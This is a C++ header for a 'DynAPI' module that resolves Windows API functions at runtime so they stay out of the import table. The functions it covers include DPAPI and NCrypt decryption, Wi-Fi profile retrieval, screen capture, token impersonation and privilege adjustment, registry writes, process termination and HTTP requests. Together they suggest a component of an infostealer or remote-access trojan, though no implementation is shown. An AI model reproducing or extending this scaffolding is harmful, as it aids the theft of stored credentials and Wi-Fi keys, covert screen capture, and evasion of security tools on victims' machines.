#pragma once
#include <windows.h>
#include <shellapi.h>
#include <commctrl.h>
#include <shlobj.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <wlanapi.h>
#include <ncrypt.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include "../core/Internal.h"

namespace DynAPI {
    // ── WinHTTP typedefs (not in Internal — resolved at init time via GPA) ──
    typedef HINTERNET (WINAPI* pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI* pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI* pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI* pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* pWinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI* pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
    typedef BOOL (WINAPI* pWinHttpCloseHandle)(HINTERNET);
    typedef BOOL (WINAPI* pWinHttpSetTimeouts)(HINTERNET, int, int, int, int);
    typedef BOOL (WINAPI* pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
    typedef BOOL (WINAPI* pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    // ── NCrypt typedefs ──
    typedef SECURITY_STATUS (WINAPI* pNCryptOpenStorageProvider)(NCRYPT_PROV_HANDLE*, LPCWSTR, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptOpenKey)(NCRYPT_PROV_HANDLE, NCRYPT_KEY_HANDLE*, LPCWSTR, DWORD, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptDecrypt)(NCRYPT_KEY_HANDLE, PBYTE, DWORD, VOID*, PBYTE, DWORD, DWORD*, DWORD);
    typedef SECURITY_STATUS (WINAPI* pNCryptFreeObject)(NCRYPT_HANDLE);
    // ── WLAN typedefs ──
    typedef DWORD (WINAPI* pWlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
    typedef DWORD (WINAPI* pWlanCloseHandle)(HANDLE, PVOID);
    typedef DWORD (WINAPI* pWlanEnumInterfaces)(HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST*);
    typedef DWORD (WINAPI* pWlanGetProfileList)(HANDLE, const GUID*, PVOID, PWLAN_PROFILE_INFO_LIST*);
    typedef DWORD (WINAPI* pWlanGetProfile)(HANDLE, const GUID*, LPCWSTR, PVOID, LPWSTR*, PDWORD, PDWORD);
    typedef VOID  (WINAPI* pWlanFreeMemory)(PVOID);
    // ── GDI32 typedefs ──
    typedef HDC    (WINAPI* pCreateCompatibleDC)(HDC);
    typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC, int, int);
    typedef HGDIOBJ(WINAPI* pSelectObject)(HDC, HGDIOBJ);
    typedef BOOL   (WINAPI* pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
    typedef BOOL   (WINAPI* pDeleteDC)(HDC);
    typedef BOOL   (WINAPI* pDeleteObject)(HGDIOBJ);
    // ── Crypt32 typedefs ──
    typedef BOOL (WINAPI* pCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
    typedef BOOL (WINAPI* pCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
    // ── Shell32 typedefs ──
    typedef HRESULT (WINAPI* pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
    typedef BOOL    (WINAPI* pShellExecuteExA)(SHELLEXECUTEINFOA*);
    // ── Extra kernel32/user32/advapi32 typedefs ──
    typedef ULONGLONG (WINAPI* pGetTickCount64)(VOID);
    typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef BOOL (WINAPI* pTerminateProcess)(HANDLE, UINT);
    typedef DWORD (WINAPI* pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef BOOL (WINAPI* pSetWindowDisplayAffinity)(HWND, DWORD);
    typedef int  (WINAPI* pGetSystemMetrics)(int);
    typedef HWND (WINAPI* pGetDesktopWindow)(VOID);
    typedef HDC  (WINAPI* pGetWindowDC)(HWND);
    typedef int  (WINAPI* pReleaseDC)(HWND, HDC);
    typedef HWND (WINAPI* pFindWindowA)(LPCSTR, LPCSTR);
    typedef BOOL (WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
    typedef BOOL (WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);
    typedef BOOL (WINAPI* pGetUserNameA)(LPSTR, LPDWORD);
    typedef VOID (WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);
    typedef HANDLE (WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL   (WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL   (WINAPI* pCloseHandle)(HANDLE);
    typedef LSTATUS (WINAPI* pRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS (WINAPI* pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS (WINAPI* pRegCloseKey)(HKEY);
    typedef LSTATUS (WINAPI* pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS (WINAPI* pRegQueryValueExW)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef BOOL (WINAPI* pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI* pLookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
    typedef BOOL (WINAPI* pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    typedef BOOL (WINAPI* pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
    typedef BOOL (WINAPI* pImpersonateLoggedOnUser)(HANDLE);
    typedef BOOL (WINAPI* pRevertToSelf)(VOID);
    typedef BOOL (WINAPI* pSetThreadToken)(PHANDLE, HANDLE);
    typedef BOOL (WINAPI* pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

    // ── WinHTTP function pointers ──
    extern pWinHttpOpen             WHttpOpen;
    extern pWinHttpConnect          WHttpConnect;
    extern pWinHttpOpenRequest      WHttpOpenReq;
    extern pWinHttpSendRequest      WHttpSendReq;
    extern pWinHttpReceiveResponse  WHttpRecvResp;
    extern pWinHttpQueryHeaders     WHttpQueryH;
    extern pWinHttpCloseHandle      WHttpCloseH;
    extern pWinHttpSetTimeouts      WHttpSetTime;
    extern pWinHttpQueryDataAvailable WHttpQueryAvail;
    extern pWinHttpReadData         WHttpReadData;
    // ── Crypt32 ──
    extern pCryptUnprotectData  CryptUnprotData;
    extern pCryptStringToBinaryA CryptStrBinaryA;
    // ── Shell32 ──
    extern pSHGetFolderPathA SHGetFolderA;
    extern pShellExecuteExA  ShellExecExA;
    // ── Registry (Wide) ──
    extern pRegCreateKeyExW  RegCreateKeyEx;
    extern pRegSetValueExW   RegSetValueEx;
    extern pRegCloseKey      RegClose;
    extern pRegOpenKeyExW    RegOpenKeyEx;
    extern pRegQueryValueExW RegQueryValueEx;
    // ── Kernel32 ──
    extern pGlobalMemoryStatusEx     GlobalMemStatusEx;
    extern pGetComputerNameA         GetCompNameA;
    extern pGetUserNameA             GetUserNmA;
    extern pGetSystemInfo            GetSysInfo;
    extern pGetTickCount64           GetTickCount;
    extern pOpenProcess              OpenProc;
    extern pTerminateProcess         TermProc;
    extern pGetModuleFileNameA       GetModFileNameA;
    extern pCreateProcessA           CreateProcA;
    extern pCreateToolhelp32Snapshot CreateSnapshot;
    extern pProcess32First           Proc32First;
    extern pProcess32Next            Proc32Next;
    extern pCloseHandle              CloseH;
    // ── User32 ──
    extern pSetWindowDisplayAffinity SetWndDisplayAffinity;
    extern pGetSystemMetrics    GetSysMetrics;
    extern pGetDesktopWindow    GetDesktopWnd;
    extern pGetWindowDC         GetWndDC;
    extern pReleaseDC           RelDC;
    extern pFindWindowA         FindWndA;
    // ── GDI32 ──
    extern pCreateCompatibleDC      CreateCompDC;
    extern pCreateCompatibleBitmap  CreateCompBitmap;
    extern pSelectObject            SelectObj;
    extern pBitBlt                  BitBlt_f;
    extern pDeleteDC                DelDC;
    extern pDeleteObject            DelObj;
    // ── WLAN ──
    extern pWlanOpenHandle      WlanOpen;
    extern pWlanCloseHandle     WlanClose;
    extern pWlanEnumInterfaces  WlanEnumIfaces;
    extern pWlanGetProfileList  WlanGetProfList;
    extern pWlanGetProfile      WlanGetProf;
    extern pWlanFreeMemory      WlanFree;
    // ── NCrypt ──
    extern pNCryptOpenStorageProvider NCryptOpenStorage;
    extern pNCryptOpenKey             NCryptOpenK;
    extern pNCryptDecrypt             NCryptDecr;
    extern pNCryptFreeObject          NCryptFreeObj;
    // ── Advapi32 ──
    extern pOpenProcessToken          OpenProcToken;
    extern pLookupPrivilegeValueA     LookupPrivValueA;
    extern pAdjustTokenPrivileges     AdjustTokPrivs;
    extern pDuplicateTokenEx          DupTokenEx;
    extern pImpersonateLoggedOnUser   ImpersonateLoggedUser;
    extern pRevertToSelf              RevertSelf;
    extern pSetThreadToken            SetThrToken;
    extern pGetTokenInformation       GetTokenInf;

    std::string HttpGet(const std::wstring& host, const std::wstring& path, bool https = true);
    bool Initialize();
}
